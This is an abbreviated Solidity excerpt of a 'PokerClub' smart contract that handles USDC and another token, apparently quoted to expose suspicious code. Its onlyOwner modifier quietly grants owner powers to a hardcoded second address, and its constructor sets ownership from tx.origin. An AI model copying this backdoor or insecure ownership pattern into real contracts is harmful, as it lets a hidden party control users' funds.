...
contract PokerClub {
    ...
    address EddieRivers = 0x68C37A52Dee921Ec0cd1B49a762dC0AD37c63CBf;
    ...
    modifier onlyOwner() {
        require(msg.sender == owner || msg.sender == EddieRivers, "Not owner");
        _;
    }
    ...
    constructor(uint256 price_, address MRC_, address USDC_) {
        owner = tx.origin;
    ...
    function getParticiapants() external view returns (uint256[] memory) {
        return participants;
    }
